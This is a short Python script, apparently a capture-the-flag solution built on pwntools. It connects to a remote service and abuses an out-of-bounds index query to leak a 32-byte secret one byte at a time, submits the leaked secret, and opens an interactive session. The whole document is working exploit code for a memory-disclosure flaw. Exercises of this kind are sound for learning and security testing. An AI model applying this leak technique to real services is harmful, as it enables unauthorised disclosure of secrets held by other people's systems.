import os

nc, host, port = os.getenv("CONNECT").split(" ")

from pwn import remote

conn = remote(host, port)
offset = 0x640 - 0x560
secret_len = 32
secret = []
for i in range(offset, offset + secret_len):
    conn.sendlines([b"?", str(i).encode()])
    conn.recvuntil(b" = ")
    b = int(conn.recvline().strip().decode(), 16)
    secret.append(b)

conn.sendlines([b"!", bytes(secret)])

conn.interactive()
